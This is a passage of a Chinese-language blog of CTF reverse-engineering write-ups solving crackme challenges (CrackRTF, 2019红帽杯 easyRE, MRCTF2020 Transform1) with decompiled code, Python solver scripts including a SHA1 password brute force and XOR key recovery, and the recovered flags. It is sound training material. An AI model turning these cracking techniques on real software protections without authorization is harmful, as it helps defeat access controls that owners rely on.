class="string">&#x27;?&#x27;</span></span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">406741500</span>//<span class="number">7532250</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">294236496</span>//<span class="number">5551632</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">177305856</span>//<span class="number">3409728</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">650683500</span>//<span class="number">13013670</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">298351053</span> //<span class="number">6088797</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">386348487</span>//<span class="number">7884663</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">438258597</span>//<span class="number">8944053</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">249527520</span>//<span class="number">5198490</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">445362764</span>//<span class="number">4544518</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">174988800</span>//<span class="number">3645600</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">981182160</span>//<span class="number">10115280</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">493042704</span>//<span class="number">9667504</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">257493600</span>//<span class="number">5364450</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">767478780</span>//<span class="number">13464540</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">312840624</span> //<span class="number">5488432</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>( <span class="number">1404511500</span>//<span class="number">14479500</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">316139670</span>//<span class="number">6451830</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">619005024</span>//<span class="number">6252576</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">372641472</span>//<span class="number">7763364</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">373693320</span>//<span class="number">7327320</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">498266640</span>//<span class="number">8741520</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">452465676</span>//<span class="number">8871876</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">208422720</span>//<span class="number">4086720</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">515592000</span>//<span class="number">9374400</span>)</span><br><span class="line">flag+=<span class="built_in">chr</span>(<span class="number">719890500</span>//<span class="number">5759124</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意看其中是没有al[6]的所以我们用？代替得出flag：</span></span><br><span class="line"></span><br><span class="line"> flag&#123;e?<span class="number">654211</span>10b0a3099a1c039337&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#看了一下他们的wp，他们是把问号的值从0~10依次带入得到flag。</span></span><br><span class="line"><span class="comment">#flag+=&quot;&quot;和flag+=&#x27;&#x27;其实是一个意思</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>flag{e165421110ba03099a1c039337}</p>
<p><strong>收获 ：</strong></p>
<p>复习了一下upx的破壳。</p>
<p>基本没有什么思路，看的别人的wp。</p>
<h2 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h2><p>2023.11.28-2023.11.29</p>
<p>首先点开文件，看见到了password1，初步推测为密码分段处理。</p>
<p>无壳，ida打开，F5找到main函数</p>
<p>首先，分析一下知道了函数大概的意思，</p>
<p>大致的流程就是运行程序后，输入第一个密码，密码长度为6；密码的范围是100000到999999.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v7 &lt; <span class="number">100000</span> )</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//这块可以看出第一段的密码不能小于100000</span></span><br><span class="line"><span class="comment">//又因为它必须是6位数，所以最大为999999</span></span><br></pre></td></tr></table></figure>



<p>然后将密码1+@DBApp；对“密码1+@DBApp”进行加密，加密后if判断成功，接着输入第二个密码，第二个密码长度也为6，继续将Destination跟密码2连接起来，形成一个长度位18的Str，对Str进行加密；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">v7 = atoi(Destination);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &lt; <span class="number">100000</span> )</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">strcat</span>(Destination, <span class="string">&quot;@DBApp&quot;</span>);<span class="comment">//strcat函数是将&quot;@DBApp&quot;接在Destination的后面</span></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Destination);</span><br><span class="line">  sub_40100A((BYTE *)Destination, v3, String1);</span><br><span class="line">  <span class="keyword">if</span> ( !_strcmpi(String1, <span class="string">&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">      .......</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在计算第一个密码段时，主要的是有一个函数，点进去。我们可以在函数<code>sub_40100A</code>里面可以看见关键的一句<code>CryptCreateHash(phProv, 0x8004u, 0, 0, &amp;phHash)</code>这个是运用的哈希加密，我们上网搜索了解了一下哈希算法，</p>
<p>搜索哈希算法0x8004,了解了它是运用了SHA1哈希算法进行加密，然后就可以编写一下脚本了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">string=<span class="string">&#x27;@DBApp&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">999999</span>):</span><br><span class="line">    flag=<span class="built_in">str</span>(i)+string   <span class="comment">#代码使用str(i)将循环变量i转换为字符串</span></span><br><span class="line">    x = hashlib.sha1(flag.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    y = x.hexdigest()</span><br><span class="line">    <span class="comment">#hexdigest() 是 Python 中 hashlib 模块中 hash 对象的一个方法。它用于获取哈希对象的十六进制表示形式。</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span> == y:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<p>得到为123321@DBApp</p>
<p>所以说password1为123321</p>
<hr>
<hr>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcat</span>(Str, Destination);</span><br><span class="line">    <span class="built_in">memset</span>(String1, <span class="number">0</span>, <span class="keyword">sizeof</span>(String1));<span class="comment">//这是一个内存操作，将String1字符串的内容全部设置为0。</span></span><br><span class="line">    v4 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    sub_401019((BYTE *)Str, v4, String1);</span><br><span class="line">    <span class="keyword">if</span> ( !_strcmpi(<span class="string">&quot;27019e688a4e62a649fd99cadaafdb4e&quot;</span>, String1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> __int8)sub_40100F(Str) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error!!\n&quot;</span>);</span><br><span class="line">        ExitProcess(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;bye ~~\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>第二部分与第一部分相似，输入六位后进行拼接，将长度的值赋给v4，我们进入<code>sub_401019</code>函数，对数据进行处理、进行查看分析，只不过标识码变成了 0x8003u ，查询知是 md5 加密，用脚本爆破没出来结果，接着向下看，进入 <code>sub_40100F</code>函数</p>
<p>除了 FindResourceA， SizeofResource， LoadResource， LockResource 和 CreateFileA 外还有一个处理函数，进去康康</p>
<p>里面就是异或，a3 的值是从SizeofResource中获取，大概是从文件AAA中取得0x65这个信息，复制到lpBuffer中，将文件中取得的信息进行异或，生成.RTF文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hFile = CreateFileA(<span class="string">&quot;dbapp.rtf&quot;</span>, <span class="number">0x10000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>这段代码执行了资源的查找、加载和写入文件的操作。它从资源中获取数据并将其写入名为 “dbapp.rtf” 的文件中。具体的资源和文件操作取决于代码中使用的资源标识符、资源类型和文件名。</p>
<p>用resource_hacker进行信息的获取</p>
<img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444673.png" alt="image-20231129201841574" style="zoom:50%;" />



<p>用010 Editor对.rtf进行查看</p>
<img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444417.png" alt="image-20231129201624746" style="zoom:50%;" />



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v5 = lstrlenA(lpString);</span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   result = i;</span><br><span class="line">   <span class="keyword">if</span> ( i &gt;= a3 )</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   *(_BYTE *)(i + a2) ^= lpString[i % v5];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> result;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>取前六位 05 7D 41 15 26 01 ，和 rtf 文件头7B 5C 72 74 66 31两者进行异或</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rtft = [<span class="number">0x7B</span> ,<span class="number">0x5C</span> ,<span class="number">0x72</span> ,<span class="number">0x74</span> ,<span class="number">0x66</span> ,<span class="number">0x31</span>]</span><br><span class="line">aaa = [<span class="number">0x05</span>,<span class="number">0x7D</span>,<span class="number">0x41</span>,<span class="number">0x15</span>,<span class="number">0x26</span>,<span class="number">0x01</span>]</span><br><span class="line">pass2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    pass2 += <span class="built_in">chr</span>(rtft[i]^aaa[i])</span><br><span class="line"><span class="built_in">print</span>(pass2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到第二个密码。</p>
<p>~!3a@0</p>
<p>运行程序，分别输入俩个密码，程序会在同一个目录下创建一个文件，打开发现flag</p>
<p>flag{N0_M0re_Free_Bugs}</p>
<p><strong>收获：</strong></p>
<p>了解了哈希加密算法</p>
<p>了解了哈希加密中hexdigest()函数 是 Python 中 hashlib 模块中 hash 对象的一个方法。它用于获取哈希对象的十六进制表示形式。</p>
<h3 id="哈希加密"><a href="#哈希加密" class="headerlink" title="哈希加密:"></a>哈希加密:</h3><p>Hash加密算法是一种将任意长度的消息压缩成固定长度散列值的算法。它的特点是快速、不可逆和安全。Hash加密算法被广泛用于数字签名、数据完整性验证等信息安全领域。本文将介绍Hash加密算法的基本原理、常用算法和应用场景。</p>
<p>   <a target="_blank" rel="noopener" href="https://blog.csdn.net/javasimawanyi/article/details/131643604">https://blog.csdn.net/javasimawanyi/article/details/131643604</a></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607897.png" alt="image-20231128195135397"></p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top6/202505031607898.png" alt="image-20231128203724526"></p>
<h2 id="2019红帽杯-easyRE"><a href="#2019红帽杯-easyRE" class="headerlink" title="[2019红帽杯]easyRE"></a>[2019红帽杯]easyRE</h2><p>2023.12.4，2024.1.25</p>
<p>文件后缀为.elf 第一次看见这种后缀，无壳，64位，拖入ida</p>
<p>进去之后找不到main函数，搜索一下找不到明显的flag，查看一下字符串</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444040.png" alt="image-20240125135416056"></p>
<p>观察图片，我们看到<strong>“You found me”</strong>,其实就可以大概判断我们所找的就为它。</p>
<p>观察到<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code>提示为base64编码。（提示我们可能用到base64在线解密）。</p>
<p>我们找到它，F5反汇编一下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">  v19 = __readfsqword(<span class="number">0x28</span>u);<span class="comment">//读入v19，40位</span></span><br><span class="line">  qmemcpy(v12, <span class="string">&quot;Iodl&gt;Qnb(ocy&quot;</span>, <span class="number">12</span>);<span class="comment">//v12=&quot;Iodl&gt;Qnb(ocy&quot;</span></span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v13, <span class="string">&quot;y.i&quot;</span>, <span class="number">3</span>);<span class="comment">//v13=&quot;y.i&quot;</span></span><br><span class="line">  v13[<span class="number">3</span>] = <span class="number">127</span>;</span><br><span class="line">  qmemcpy(v14, <span class="string">&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span>, <span class="keyword">sizeof</span>(v14));<span class="comment">//v14=&quot;d`3w&#125;wek9&#123;iy=~yL@EC&quot;</span></span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="keyword">sizeof</span>(v15));<span class="comment">//v15初始化</span></span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  sub_4406E0(<span class="number">0LL</span>, v15, <span class="number">37LL</span>);<span class="comment">///LL为长长整型所以括号里为（0，v15，37）</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"> <span class="comment">//sub_4406E0(0LL, v15, 37LL);函数如下：</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( dword_6CF29C )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = sub_443B80();</span><br><span class="line">    sub_443BE0(v4, a2, sys_read(a1, a2, v5));</span><br><span class="line">    result = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">  &#125;</span><br><span class="line">  result = sys_read(a1, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_5:</span><br><span class="line">    __writefsdword(<span class="number">0xFFFFFFD0</span>, -(<span class="type">int</span>)result);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( sub_424BA0(v15) == <span class="number">36</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; (<span class="type">unsigned</span> __int64)sub_424BA0(v15); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v15[i] ^ i) != v12[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_410CC0(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">65</span>);</span><br><span class="line">    sub_4406E0(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )<span class="comment">//39转为字符为&#x27;</span></span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////</span></span><br><span class="line">      v2 = sub_400E44(v18);                   <span class="comment">//</span></span><br><span class="line">      v3 = sub_400E44(v2);                    <span class="comment">//</span></span><br><span class="line">      v4 = sub_400E44(v3);                    <span class="comment">//</span></span><br><span class="line">      v5 = sub_400E44(v4);                    <span class="comment">//</span></span><br><span class="line">      v6 = sub_400E44(v5);                    <span class="comment">//</span></span><br><span class="line">      v7 = sub_400E44(v6);  <span class="comment">//这里的 sub_400E44//</span></span><br><span class="line">      v8 = sub_400E44(v7); <span class="comment">//为base64编码      //</span></span><br><span class="line">      v9 = sub_400E44(v8);                    <span class="comment">//</span></span><br><span class="line">      v10 = sub_400E44(v9);                   <span class="comment">//</span></span><br><span class="line">      v11 = sub_400E44(v10);                  <span class="comment">//</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////       </span></span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_410CC0(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        sub_410CC0(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>有点难，看的别人的wp</p>
<p>[BUUCTF逆向题<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79218813/article/details/133972583?ops_request_misc=%7B%22request_id%22:%22170616134116800226525862%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170616134116800226525862&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-133972583-null-null.142%5Ev99%5Epc_search_result_base7&utm_term=%5B2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%5DeasyRE&spm=1018.2226.3001.4187">2019红帽杯]easyRE_2019红帽杯easyre-CSDN博客</a></p>
<h2 id="MRCTF2020-Transform1"><a href="#MRCTF2020-Transform1" class="headerlink" title="[MRCTF2020]Transform1"></a>[MRCTF2020]Transform1</h2><p>2024.4.5</p>
<p>无壳，64位</p>
<p> 搜一下flag，F5反汇编，直接分析一下</p>
<p>看了一下，最主要的部分，就是一个简单的异或，这里用到了python的数据，翻了一翻笔记。</p>
<p>函数整体也不多，分析一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">  sub_402230(argc, argv, envp);</span><br><span class="line">  sub_40E640(<span class="string">&quot;Give me your code:\n&quot;</span>);</span><br><span class="line">  sub_40E5F0(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line"><span class="comment">//简单的输入scanf</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) != <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40E640(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">///这里只是提醒你输入字符串的长度</span></span><br><span class="line"><span class="comment">////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    byte_414040[i] = Str[dword_40F040[i]];</span><br><span class="line">    byte_414040[i] ^= LOBYTE(dword_40F040[i]);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//这里有一个简单的异或运算，应该是要仔细查看一下</span></span><br><span class="line"><span class="comment">//////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">32</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( byte_40F0E0[j] != byte_414040[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_40E640(<span class="string">&quot;Wrong!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_40E640(<span class="string">&quot;Right!Good Job!\n&quot;</span>);</span><br><span class="line">  sub_40E640(<span class="string">&quot;Here is your flag: %s\n&quot;</span>, Str);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里就是告诉我们当这两个数组相等时为我们所求。</span></span><br><span class="line"><span class="comment">//异或得出的我们的flag</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>分析的差不多，都点开看一下</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top3/202505031444364.png" alt="image-20240405202651410"></p>
<p>这里我们也是看到了几个我们知道的数组了，然后我们就可以进行编写脚本了。</p>
<p>（python数据提取得到两个数组的值）好像也不是太好使，手搓吧。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">dword_40F040=[<span class="number">0x9</span>,<span class="number">0xa</span>,<span class="number">0xf</span>,<span class="number">0x17</span>,<span class="number">0x7</span>,<span class="number">0x18</span>,<span class="number">0x0c</span>,<span class="number">0x6</span>,<span class="number">0x1</span>,<span class="number">0x10</span>,<span class="number">0x3</span>,<span class="number">0x11</span>,<span class="number">0x20</span>,<span class="number">0x1d</span>,<span class="number">0x0b</span>,<span class="number">0x1e</span>,<span class="number">0x1b</span>,<span class="number">0x16</span>,<span class="number">0x4</span>,<span class="number">0x0d</span>,<span class="number">0x13</span>,<span class="number">0x14</span>,<span class="number">0x15</span>,<span class="number">0x2</span>,<span class="number">0x19</span>,<span class="number">0x5</span>,<span class="number">0x1f</span>,<span class="number">0x8</span>,<span class="number">0x12</span>,<span class="number">0x1a</span>,<span class="number">0x1c</span>,<span class="number">0x0e</span>,<span class="number">0x8</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">byte_40F0E0=[<span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x4C</span>, <span class="number">0x57</span>,<span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>,<span class="number">0x3F</span>,<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span>=[<span class="number">0</span>]*<span class="number">33</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,<span class="number">32</span>):</span><br><span class="line">        byte_40F0E0[i] ^= dword_40F040[i]</span><br><span class="line">        <span class="built_in">str</span>[dword_40F040[i]]= byte_40F0E0[i] </span><br><span class="line">        </span><br><span class="line"><span 